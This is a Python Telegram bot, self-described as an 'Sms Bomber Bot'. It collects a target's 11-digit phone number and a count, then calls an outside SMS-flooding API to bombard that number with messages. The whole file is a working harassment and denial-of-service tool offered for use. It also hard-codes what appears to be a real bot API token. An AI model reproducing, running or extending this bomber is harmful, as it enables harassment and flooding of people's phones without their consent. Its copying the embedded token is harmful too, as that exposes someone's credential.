import telebot
import requests

# Initialize your bot with the API token
bot = telebot.TeleBot("6568726716:AAFsyPCoss117TpWFbxte0_aNW8DO0SZ_Xg")

# Define commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to My Sms Bomber Bot! Use /sms to send SMS BOMBING.")

@bot.message_handler(commands=['sms'])
def send_sms_request(message):
    # Ask for phone number
    bot.reply_to(message, "Please enter your 11-digit phone number:")

    # Set the next step for handling phone number
    bot.register_next_step_handler(message, process_phone_number)

def process_phone_number(message):
    # Validate phone number
    phone_number = message.text
    if len(phone_number) != 11 or not phone_number.isdigit():
        bot.reply_to(message, "Invalid phone number. Please enter a valid 11-digit number.")
        return

    bot.reply_to(message, "Please enter the amount (up to 10):")

    # Set the next step for handling amount
    bot.register_next_step_handler(message, process_amount, phone_number)

def process_amount(message, phone_number):
    # Validate amount
    amount_str = message.text
    if not amount_str.isdigit():
        bot.reply_to(message, "Invalid amount. Please enter a valid number.")
        return

    amount = int(amount_str)
    if amount < 1 or amount > 10:
        bot.reply_to(message, "Amount should be between 1 and 10.")
        return

    bot.reply_to(message, "SMS sending in progress...")  # Inform user about SMS sending in progress

    # Make the API call for sending SMS
    url = f"https://api.teamxdraco.my.id/Sms.php?phone={phone_number}&amount={amount}"
    responses = []
    for _ in range(1):
        try:
            resp = requests.get(url)
            responses.append(resp.text)  # Collect API responses
        except requests.exceptions.RequestException as e:
            print(f"Network Connection error: {e}")
            responses.append(f"Failed to send SMS due to network error.")

    bot.reply_to(message, f"All SMS sent to {phone_number}.")

# Run the bot
if __name__ == "__main__":
    try:
        bot.polling()
    except Exception as e:
        print(f"Bot polling error: {e}")
